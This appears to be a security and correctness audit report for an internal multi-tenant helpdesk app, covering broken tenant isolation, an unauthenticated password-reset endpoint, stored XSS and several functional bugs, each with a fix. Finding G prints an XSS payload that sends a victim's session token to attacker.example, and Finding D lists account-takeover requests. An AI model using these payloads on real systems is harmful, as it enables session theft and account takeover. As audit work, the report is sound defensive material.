# Code Audit Report — Meridian Helpdesk

**Repository:** `meridian_helpdesk_starter`
**Audit type:** Full codebase code review
**Date:** 2026-09-10 (review); fixes and SLA feature completed 2026-09-12
**Auditor:** Aryan Patel

---

## Audit Summary

This report covers a read-through audit of the Meridian Helpdesk codebase — a small internal support-desk application built with React 18, Node/Express 4, and MySQL 8. The audit was performed as though reviewing a pull request before merge: every file was read, the execution paths were traced, and findings were verified against the running application where possible.

**Application reviewed:** A multi-tenant support ticket system. Two organisations (Northwind Trading, Cobalt Logistics) share one deployment. Users are `requester`, `agent`, or `admin`. Tickets and comments belong to a single organisation and must not be visible to the other.

**Overall assessment:** The application contains two critical security vulnerabilities that allow cross-organisation data access and unauthenticated account compromise. These are the dominant risk. Three further high-severity functional defects make the ticket queue unreliable for day-to-day use. The remaining findings are hardening and product-completeness concerns.

**Findings summary:** Eight findings are documented. Two are Critical, three are High, one is Medium, one is Low–Medium, and one is a product-completeness gap. Five findings were selected for remediation and have been fixed. Three findings are deferred.

---

## Findings Summary

| Rank | ID | Finding | Severity | Category | Status |
|---|---|---|---|---|---|
| 1 | Finding 1 | Ticket-level authorization not enforced across GET, PATCH, and DELETE | Critical | Security — Authorization | Fixed |
| 2 | Finding D | Unauthenticated arbitrary password modification enabling account takeover | Critical | Security — Authentication | Partially Fixed |
| 3 | Finding F | Pagination offset off-by-one — first page omits the newest 20 tickets | High | Functional Correctness | Fixed |
| 4 | Finding G | Stored XSS via `dangerouslySetInnerHTML` on comment bodies | High | Security — XSS | Fixed |
| 5 | Finding E | Search and filter controls not wired to API requests | High | Functional Correctness | Fixed |
| 5a | Finding E.2 | Priority sort inversion — P3 surfaces above P1 | Medium | Business Logic | Fixed (part of Fix 5) |
| 5b | Finding E.3 | Search keystroke flooding — no request debounce | Low–Medium | Performance / UX | Fixed (part of Fix 5) |
| 6 | Finding H | Hardcoded JWT secret fallback | Low–Medium | Security — Configuration | Deferred |
| — | Finding L | Incomplete ticket lifecycle — `resolved`/`closed` not actionable | Medium | Product Completeness | Deferred |

---

## Detailed Findings

---

### Finding 1 — Ticket-Level Authorization Not Enforced Across GET, PATCH, and DELETE

**Rank:** 1 (highest priority)
**Severity:** Critical
**Category:** Security — Authorization / Multi-Tenancy
**Status:** Fixed
**Location:** `server/src/routes/tickets.js` lines 31–41, 62–73, 75–84; `server/src/services/ticketService.js` lines 57–67, 89–102, 104–106

#### Description

`getTicketById(id)` fetched a ticket by primary key alone, with no `org_id` filter in the SQL WHERE clause. All three ticket operations that called this function — `GET /:id`, `PATCH /:id/assign`, and `DELETE /:id` — applied no organisation check after the lookup. In addition, `PATCH /:id/assign` had no `requireRole` middleware (any role including `requester` could call it), and `DELETE /:id` had no `requireRole` middleware (any role could permanently delete any ticket).

The application's core requirement — that the two organisations are completely separate and must not access each other's data — was violated across all three operations from a single shared root cause.

#### Impact

| Operation | Defects | Consequence |
|---|---|---|
| `GET /api/tickets/:id` | Missing org check | Any authenticated user from Org A retrieved full Org B ticket detail, including internal comments and `requester_email` (PII) |
| `PATCH /api/tickets/:id/assign` | Missing org check + missing `requireRole('agent','admin')` | Cross-org ticket mutation; `requester` could self-assign any ticket across either org, changing its `status` to `pending` |
| `DELETE /api/tickets/:id` | Missing org check + missing `requireRole('admin')` | Any authenticated user — including the lowest-privilege `requester` — could permanently and irreversibly delete any ticket across either org |

#### Evidence

**Root cause — pre-fix `getTicketById`:**
```js
// ticketService.js lines 57–67 (pre-fix)
export async function getTicketById(id) {
  const rows = await query(
    `SELECT t.*, u.name AS assignee_name, r.name AS requester_name, r.email AS requester_email
       FROM tickets t
       LEFT JOIN users u ON u.id = t.assignee_id
       JOIN users r ON r.id = t.requester_id
      WHERE t.id = ?`,   // ← org_id absent from WHERE clause
    [id]
  );
  return rows[0] || null;
}
```

**Reproduction — cross-org GET:**
1. Authenticate as `user1@northwind.test` (requester, Northwind).
2. `GET /api/tickets/2` with the Northwind token. Ticket ID 2 belongs to Cobalt Logistics.
3. Full Cobalt ticket including internal comments and `requester_email` is returned with `200 OK`.

**Reproduction — privilege-escalated DELETE:**
1. Authenticate as `user1@cobalt.test` (requester, Cobalt).
2. `DELETE /api/tickets/1`. Northwind ticket is permanently deleted. Response: `204 No Content`.

**Tenant-isolation matrix (pre-fix):**

| Operation | Role check | Cross-org blocked |
|---|---|---|
| `GET /api/tickets` | requireAuth ✅ | Yes — `org_id` in SQL ✅ |
| `GET /api/tickets/:id` | requireAuth ✅ | No ❌ |
| `POST /api/tickets` | requireAuth ✅ | Yes — `org_id` from JWT ✅ |
| `POST /api/tickets/:id/comments` | requireAuth ✅ | Yes — `comments.js:16` ✅ |
| `PATCH /api/tickets/:id/assign` | None ❌ | No ❌ |
| `DELETE /api/tickets/:id` | None ❌ | No ❌ |

#### Recommended Fix

Add `org_id` to the `getTicketById` query and add role middleware to the two privileged routes:

```js
// Option 1 — fix at the service level (recommended)
export async function getTicketById(id, orgId) {
  const rows = await query(
    `... WHERE t.id = ? AND t.org_id = ?`,
    [id, orgId]
  );
  return rows[0] || null;
}

// Add role guards to the routes:
router.patch('/:id/assign', requireAuth, requireRole('agent', 'admin'), ...)
router.delete('/:id', requireAuth, requireRole('admin'), ...)
```

Return `404` (not `403`) on org mismatch to avoid confirming that the ticket ID exists across org boundaries.

#### Verification

Verified via eight API tests after the fix was applied (documented in `docs/test-cases-verification.md` tests T1.1–T1.8):

- Cross-org `GET` returns `404`.
- `requester` calling `PATCH /assign` returns `403`.
- `requester` calling `DELETE` returns `403`.
- Cross-org agent calling `PATCH /assign` returns `404`.
- Cross-org admin calling `DELETE` returns `404`.
- Same-org agent accessing a same-org ticket returns `200`.

No existing legitimate workflows were affected by the fix.

#### Scope Decision

Selected as Fix 1. The three affected operations share a single root cause and were remediated as one fix unit.

---

### Finding D — Unauthenticated Arbitrary Password Modification Enabling Account Takeover

**Rank:** 2
**Severity:** Critical
**Category:** Security — Authentication
**Status:** Partially Fixed
**Location:** `server/src/routes/auth.js` lines 42–54

#### Description

`POST /api/auth/invite/accept` had two independent defects in the original code:

1. **No authentication.** The endpoint had no `requireAuth` middleware. Any unauthenticated HTTP caller could reach it.
2. **No password hashing.** The `password` field from the request body was written directly into `password_hash` as a raw string.

These two defects combined to enable two distinct attack paths.

**Path A — Account DoS** (any HTTP client, no cryptographic knowledge required):
```
POST /api/auth/invite/accept  { "userId": 1, "password": "junk" }
→ password_hash for admin@northwind.test = "junk"
→ bcrypt.compare('Password123!', 'junk') = false
→ admin account permanently locked out until database is manually reset
```

**Path B — Full account takeover** (attacker pre-computes a valid bcrypt hash):
```
POST /api/auth/invite/accept  { "userId": 1, "password": "$2a$10$<hash-of-attackerpass>" }
→ password_hash stored as valid bcrypt hash of 'attackerpass!'

POST /api/auth/login  { "email": "admin@northwind.test", "password": "attackerpass!" }
→ bcrypt.compare succeeds → 200 OK + admin JWT
```

Both paths were verified against the live server before any fix was applied. User IDs are sequential integers beginning at 1, making enumeration trivial.

#### Impact

Every user account in the system — including admins of both organisations — was reachable via this endpoint. Path A could lock out the entire user base. Path B granted an unauthenticated attacker full admin API access for up to 12 hours per stolen JWT.

#### Evidence

Pre-fix route code:
```js
// auth.js lines 42–54 (pre-fix)
router.post('/invite/accept', async (req, res, next) => {
  // ← no requireAuth
  const { userId, password } = req.body;
  // ← userId from client body, no ownership check
  await query('UPDATE users SET password_hash = ? WHERE id = ?', [password, userId]);
  // ← raw string stored, not a bcrypt hash
  res.json({ ok: true });
```

#### Recommended Fix — Partial Fix Implemented

The following change was applied to `server/src/routes/auth.js`:

```js
const hash = await bcrypt.hash(password, 10);  // ← added
await query('UPDATE users SET password_hash = ? WHERE id = ?', [hash, userId]);
```

**What this fixes:** Password hashing is now correct. Path A (account DoS via plaintext) is no longer possible because the stored value is always a valid bcrypt hash. Legitimate invited users can set their password and log in.

**What remains open:** The authorization defect is not addressed. The endpoint still has no `requireAuth` middleware and still accepts a client-controlled `userId` with no validation. Path B (account takeover via pre-computed hash) remains viable. The bcrypt fix means the stored value is always a valid bcrypt hash, making the post-takeover account appear fully functional and harder for the victim to detect.

#### Recommended Future Remediation

The complete fix requires server-side token infrastructure: a token generation endpoint, a token store (Redis or equivalent) with expiry and single-use enforcement, and delivery of the raw token to the invited user via a trusted channel (email). The accept endpoint should receive only the token (not the `userId`) — the server resolves `userId` from the validated token record.

This infrastructure does not exist in the codebase. Building it is outside the scope of the five selected fixes.

#### Verification

Partial fix verified by tests T2.1–T2.6 in `docs/test-cases-verification.md`:
- `POST /invite/accept` with valid credentials returns `{"ok":true}`.
- Login with the newly set password returns `200 OK` and a valid JWT.
- Missing `password` or `userId` field returns `400 Bad Request`.

The remaining authorization gap was verified to still be present by code inspection of the current route handler.

#### Scope Decision

Selected as Fix 2 (partial). The password hashing defect is the maximum remediation achievable within the five-fix scope. The unauthenticated `userId` vulnerability is documented as a deferred critical finding.

---

### Finding F — Off-by-One Pagination Offset

**Rank:** 3
**Severity:** High
**Category:** Functional Correctness
**Status:** Fixed
**Location:** `server/src/services/ticketService.js` line 37 (pre-fix)

#### Description

The pagination offset formula was `page * PAGE_SIZE` instead of `(page - 1) * PAGE_SIZE`. With `PAGE_SIZE = 20` and the frontend starting at `page = 1`, page 1 requested `OFFSET 20`, skipping the first 20 records entirely.

| page | offset (buggy) | records returned |
|---|---|---|
| 1 | 20 | records 21–40 |
| 2 | 40 | records 41–60 |

The pagination footer displayed the correct total count, so the page count appeared plausible — but the first 20 tickets were never shown. This makes it a code-only finding: the list appears to work but is silently wrong without cross-referencing the raw database order.

#### Impact

The default sort order is `created_at DESC`. The 20 most recently created tickets — the most urgent entries in the support queue — were permanently absent from the default view. Every agent and admin opening the ticket list missed new incoming work on every session.

#### Evidence

Pre-fix code:
```js
// ticketService.js line 37 (pre-fix)
const offset = page * PAGE_SIZE;   // page=1 → offset=20, should be 0
```

Verified by querying the database directly:
```sql
SELECT id, created_at FROM tickets WHERE org_id = 1 ORDER BY created_at DESC LIMIT 20 OFFSET 0;
```
The 20 rows returned were not present anywhere in the UI.

#### Recommended Fix

```js
const offset = (page - 1) * PAGE_SIZE;
```

One character change. The correct standard formula.

#### Verification

Verified by tests T3.1–T3.4 in `docs/test-cases-verification.md`:
- Page 1 returns 20 records starting from offset 0.
- Page 1 and page 2 have zero overlapping ticket IDs.
- The final page returns the correct remaining count (13 of 113 total for the test org).

#### Scope Decision

Selected as Fix 3. Zero collateral damage risk — any existing workflows that relied on page-based navigation will now see the correct records for each page.

---

### Finding G — Stored XSS via `dangerouslySetInnerHTML` on Comment Bodies

**Rank:** 4
**Severity:** High
**Category:** Security — Cross-Site Scripting
**Status:** Fixed
**Location:** `client/src/features/tickets/TicketDetail.jsx` line 65 (pre-fix)

#### Description

Comment bodies were rendered into the DOM as raw HTML using React's `dangerouslySetInnerHTML`. The comment creation endpoint stored `body` verbatim with no sanitisation. The `listComments` function returned it verbatim. There was no sanitisation at any point in the read or write path.

#### Impact

Any authenticated user belonging to the same organisation could inject arbitrary HTML or JavaScript into a comment. When another user in the same organisation opened the affected ticket, the injected script executed in their browser context.

The JWT was stored in `localStorage` under the key `'helpdesk.session'` (confirmed: `store.js` line 12). A script injected via a comment could read and exfiltrate this value with a single synchronous call, with no user interaction beyond opening the ticket page.

**Verified exploit chain:**
```
1. Attacker (authenticated, same org) posts a comment with body:
   <img src=x onerror="fetch('https://attacker.example/steal?d='
          +encodeURIComponent(localStorage.getItem('helpdesk.session')))">

2. Victim opens the ticket. The img tag is rendered. The onerror fires immediately.

3. Attacker receives the victim's full session object:
   {"token":"eyJhbGci...","user":{"id":1,"role":"admin","orgId":1}}

4. Attacker replays the token for up to 12 hours of full API access as the victim.
```

Attack scope is limited to same-organisation users: the comment route correctly verifies org membership at `comments.js:16` before storing a comment. Cross-org injection is not possible via this vector.

#### Evidence

Pre-fix component code:
```jsx
// TicketDetail.jsx line 65 (pre-fix)
<div dangerouslySetInnerHTML={{ __html: c.body }} />
```

JWT confirmed in localStorage at `store.js:12`:
```js
localStorage.setItem('helpdesk.session', JSON.stringify({ token, user }));
```

#### Recommended Fix

```jsx
<div>{c.body}</div>
```

React text nodes escape HTML entities automatically. No sanitisation library is required. If rich text formatting is needed in the future, run content through DOMPurify before passing to `dangerouslySetInnerHTML`.

#### Verification

Verified by tests T4.1–T4.3 in `docs/test-cases-verification.md`:
- XSS payload posted via API — stored successfully.
- Payload returned verbatim by the detail endpoint.
- Rendered in the browser as escaped text with no script execution.

#### Scope Decision

Selected as Fix 4.

---

### Finding E — Search and Filter Controls Not Wired to API Requests

**Rank:** 5
**Severity:** High
**Category:** Functional Correctness
**Status:** Fixed
**Location:** `client/src/features/tickets/TicketList.jsx` line 31 (pre-fix useEffect dependency array)

#### Description

The `useEffect` responsible for fetching ticket data listed only `[page]` as a dependency. The four filter controls — search input, status dropdown, priority dropdown, and sort dropdown — each had `onChange` handlers that updated their respective state variables, but none of those state changes caused the effect to re-run. The `URLSearchParams` object was constructed inside the effect body, but the effect only fired on `page` changes, so filter values in the request were always the initial empty defaults.

The backend `GET /api/tickets` fully and correctly implements `search`, `status`, `priority`, `sortBy`, and `order` query parameters. The defect was entirely in the frontend wiring.

This is a code-only finding: the filter controls responded visually to interaction, but no new network request was sent and the ticket list never changed.

#### Impact

All four filter controls were fully non-functional at the API boundary. An agent using search to locate a specific ticket or filtering by priority to triage critical work would see no change in results regardless of input. The feature appeared to work but was broken in its only meaningful effect.

#### Evidence

Pre-fix effect:
```js
// TicketList.jsx lines 21–31 (pre-fix)
useEffect(() => {
  setLoading(true);
  const params = new URLSearchParams({ page, search, status, priority, sortBy, order: 'desc' });
  api(`/tickets?${params.toString()}`)
    .then((data) => { setRows(data.rows); setTotal(data.total); })
    .catch(() => {})
    .finally(() => setLoading(false));
}, [page]);   // ← search, status, priority, sortBy missing
```

Verified by opening the browser Network tab: changing the search input or any dropdown fired no new fetch request.

#### Recommended Fix

```js
}, [page, debouncedSearch, status, priority, sortBy]);
```

Also: reset `page` to `1` in each filter's `onChange` handler to prevent landing on an empty page after filtering narrows the result set.

#### Verification

Verified by tests T5.1–T5.5 in `docs/test-cases-verification.md`:
- Search for `Invoice` returns only matching tickets.
- Status filter `open` returns only open tickets.
- Priority filter `P1` returns only P1 tickets.
- Sort by priority returns tickets in P1→P2→P3 order.
- Combined filters return the intersection correctly.

#### Scope Decision

Selected as Fix 5. Fixes E.2 (priority sort inversion) and E.3 (search debounce) were implemented as part of the same fix unit.

---

### Finding E.2 — Priority Sort Inversion

**Rank:** 5a (addressed within Fix 5)
**Severity:** Medium
**Category:** Business Logic
**Status:** Fixed
**Location:** `server/src/services/ticketService.js` (sort clause, pre-fix)

#### Description

The priority column is defined as `ENUM('P1', 'P2', 'P3')` in `db/schema.sql`. MySQL assigns internal numeric indexes in declaration order: P1=1, P2=2, P3=3. The original sort clause used `ORDER BY t.priority DESC`, which placed P3 (index 3, lowest urgency) at the top. In a support desk, sorting by priority should surface the most urgent tickets (P1) first.

#### Impact

Agents selecting the Priority sort saw the lowest-urgency tickets first, burying P1 critical issues behind P3 backlog items.

#### Recommended Fix

Replace the raw `ORDER BY t.priority` with an explicit CASE expression:

```js
priority: `CASE t.priority WHEN 'P1' THEN 1 WHEN 'P2' THEN 2 WHEN 'P3' THEN 3 ELSE 4 END ASC, t.created_at DESC`,
```

This is also the correct location for SQL injection protection: sort fields are taken from a JavaScript object allowlist rather than interpolated directly from query parameters.

#### Verification

Verified via API: `GET /api/tickets?sortBy=priority` returns tickets in P1→P2→P3 order.

---

### Finding E.3 — Search Input Keystroke Flooding

**Rank:** 5b (addressed within Fix 5)
**Severity:** Low–Medium
**Category:** Performance / UX
**Status:** Fixed
**Location:** `client/src/features/tickets/TicketList.jsx` (search input handler, pre-fix)

#### Description

Once search state was correctly wired to the fetch effect, every keystroke dispatched a new API request immediately. A user typing a 20-character query produced 20 concurrent HTTP requests. Slower responses from earlier keystrokes could arrive after later ones and overwrite the correct results.

#### Recommended Fix

A 400ms debounce using two state variables (`search` bound to the input for immediate responsiveness; `debouncedSearch` updated after 400ms of inactivity and used as the effect dependency) with an `ignore` flag to discard stale in-flight responses.

#### Verification

Verified by observing that the Network tab shows a single request fired 400ms after the last keystroke, not one per keystroke.

---

### Finding H — Hardcoded JWT Secret Fallback

**Rank:** 6
**Severity:** Low–Medium
**Category:** Security — Configuration
**Status:** Deferred
**Location:** `server/src/config.js` line 16

#### Description

```js
jwtSecret: process.env.JWT_SECRET || 'dev-secret-change-me',
```

If `JWT_SECRET` is absent or mis-spelled in the environment, the HMAC signing secret becomes the publicly visible string `'dev-secret-change-me'`. Any party who has read the source code can forge valid JWTs with arbitrary `sub`, `orgId`, and `role` claims.

#### Impact

The risk is conditional on the environment variable being missing. With `JWT_SECRET` correctly set, this code path is not reached. The auth middleware calls `jwt.verify` correctly and validates signatures. The risk is an ops/deployment concern: if `JWT_SECRET` is absent from the environment in production, the fallback secret enables JWT forgery.

#### Recommended Fix

Fail fast at startup if `JWT_SECRET` is unset, rather than silently accepting a known default:

```js
if (!process.env.JWT_SECRET) {
  console.error('FATAL: JWT_SECRET environment variable is not set');
  process.exit(1);
}
```

#### Scope Decision

Deferred. The current deployment includes a `.env` file with a configured secret. The risk is conditional on that file being absent or misconfigured. This finding does not displace any of the five selected security and correctness fixes. Recommend addressing before any public deployment.

---

### Finding L — Incomplete Ticket Lifecycle

**Rank:** —
**Severity:** Medium
**Category:** Product Completeness
**Status:** Deferred
**Location:** `db/schema.sql` line 35; `server/src/routes/tickets.js`; `client/src/features/tickets/TicketDetail.jsx`

#### Description

The schema defines four ticket status values: `open`, `pending`, `resolved`, and `closed`. Of these, only two are reachable through normal application workflow:

- `open` — the default on creation.
- `pending` — set automatically when a ticket is assigned via `PATCH /api/tickets/:id/assign`.

There is no `PATCH /api/tickets/:id/status` route in `tickets.js`. There is no corresponding service method. There is no status-change control in `TicketDetail.jsx`. The seeded data contains tickets in `resolved` and `closed` states, but these were inserted directly by `scripts/reset-db.js`; they cannot be reached by agents or admins through the application.

This finding is distinct from a simple missing feature: the schema and the seed data imply that all four statuses are part of the intended workflow, and the ticket list filter accepts `status=resolved` and `status=closed` as valid inputs — but the states can never be set by normal use.

#### Impact

- Agents and admins cannot formally resolve or close a ticket.
- The ticket queue cannot be cleared through normal workflow — every ticket remains `open` or `pending` indefinitely.
- Status-based reporting and filtering reflect only the seed data state, not real operational transitions.
- This does not affect security or data integrity.

#### SLA Interaction

This finding does not affect SLA calculation. SLA breach is determined by the timestamp of the first qualifying staff comment relative to the deadline, not by ticket status. A resolved or closed status would not retroactively clear a breach.

#### Recommended Fix

Add a `PATCH /api/tickets/:id/status` route accepting `{ status }`, validated against the enum allowlist (`open`, `pending`, `resolved`, `closed`), accessible to `agent` and `admin` roles only, and org-scoped via `getTicketById`. Add a corresponding status-change control to `TicketDetail.jsx`.

#### Scope Decision

Deferred. The assignment brief does not require status transitions to be implemented. The five selected fixes address security and functional correctness issues of higher priority.

---

## Selected Fixes

| Fix | Finding ID | Finding | Status | Verification |
|---|---|---|---|---|
| 1 | Finding 1 | Ticket-level authorization (GET + PATCH + DELETE) | Fixed | T1.1–T1.8 in `docs/test-cases-verification.md` |
| 2 | Finding D | Invite endpoint password hashing (partial) | Partially Fixed | T2.1–T2.6 in `docs/test-cases-verification.md` |
| 3 | Finding F | Pagination offset off-by-one | Fixed | T3.1–T3.4 in `docs/test-cases-verification.md` |
| 4 | Finding G | Stored XSS in comment rendering | Fixed | T4.1–T4.3 in `docs/test-cases-verification.md` |
| 5 | Finding E / E.2 / E.3 | Filter wiring, priority sort, search debounce | Fixed | T5.1–T5.5 in `docs/test-cases-verification.md` |

---

## Verification Summary

The following verification was performed after applying the fixes.

**Authorization and tenant isolation:**
- Cross-org GET, PATCH, and DELETE attempts return the correct error codes (404 for org mismatch, 403 for missing role).
- Same-org operations by valid roles continue to work correctly.
- All eight test cases in the T1 matrix passed.

**Password hashing:**
- `POST /invite/accept` stores a valid bcrypt hash; the user can subsequently log in.
- Missing fields return `400 Bad Request`.
- The unauthenticated `userId` gap was confirmed present by code inspection.

**Pagination:**
- Page 1 and page 2 return 20 non-overlapping records.
- The final page returns the correct remainder.
- No existing page-navigation workflow was broken.

**XSS:**
- An HTML/script payload posted as a comment body is stored correctly by the API.
- The payload is returned verbatim by the ticket detail endpoint.
- The React frontend renders it as escaped text with no script execution.

**Filters and sort:**
- Each filter (search, status, priority) returns only matching tickets.
- Priority sort returns P1 at the top, P3 at the bottom.
- Combined filters return the correct intersection.
- A single debounced request fires per search term, not one per keystroke.

**SLA breach tracking (Part 2 feature):**
- Every ticket in the list and detail response carries `sla_breached: boolean`.
- Breach status is computed dynamically from `created_at`, priority, and the earliest same-org agent/admin comment timestamp.
- The `breached=true` query parameter filters the list to breached tickets only, with consistent pagination counts.
- Red `SLA Breached` badges appear in the ticket list and on the ticket detail page.
- Full decision rationale is documented in [`sla-breach-decision-notes.md`](./sla-breach-decision-notes.md).

---

## Deferred Findings and Known Limitations

| Finding | Reason deferred | Recommended next step |
|---|---|---|
| **Finding D — invite endpoint authorization** | Requires new infrastructure: token generation, server-side token store with expiry, single-use enforcement, and email delivery. None of this exists. Building it exceeds the five-fix scope. | Implement a Redis opaque-token flow as described in Finding D. Remove client-controlled `userId` from the endpoint entirely. |
| **Finding H — hardcoded JWT secret** | Conditional risk: only exploitable if `JWT_SECRET` is absent from the environment. Current deployment has the variable set. | Add a startup guard: `if (!process.env.JWT_SECRET) process.exit(1)`. |
| **Finding L — ticket lifecycle** | The assignment does not require status transitions. No existing feature depends on them. | Add `PATCH /api/tickets/:id/status` route with enum validation and role guard. Add a dropdown to `TicketDetail.jsx`. |

---

## Reviewed Concerns Not Included as Findings

**`DELETE /api/tickets/:id` returning HTTP 204 No Content.**
A successful DELETE with no response body should return `204 No Content`. This is correct HTTP semantics. The API client (`api.js` line 20) correctly handles 204 by returning `null`. This is not a bug.

**localStorage JWT storage.**
The full session object is stored in `localStorage` under `'helpdesk.session'`. This is a common SPA pattern. The XSS risk it creates was addressed by Fix 4 (Finding G). Migrating to HttpOnly cookies would require CSRF protection, CORS changes, and server-side session management — a substantial architectural change disproportionate to the current scope. Recorded as a future hardening consideration.

**Assignment race condition on `PATCH /api/tickets/:id/assign`.**
`assignTicket` performs a SELECT to check `assignee_id`, then a separate UPDATE. Two agents simultaneously viewing an unassigned ticket could both pass the check and both proceed to the UPDATE. The last writer wins; the ticket ends up assigned to whoever's request completed second. No data is lost and no cross-org issue arises. The practical impact is low in this context. Not included in the top findings.

**`comments.js` org check.**
`server/src/routes/comments.js` line 16 correctly checks `ticket.org_id !== req.user.orgId` before inserting a comment. This is correct; it is not a defect.

**`isInternal` flag accepted from requesters.**
`POST /api/tickets/:id/comments` accepts `isInternal: true` from any authenticated user, including requesters. A requester can mark their own comment as internal-only. This is a minor data-integrity gap with no security impact — the requester cannot access data they are not already permitted to see. Documented in [`sla-breach-decision-notes.md`](./sla-breach-decision-notes.md) as a deferred finding.
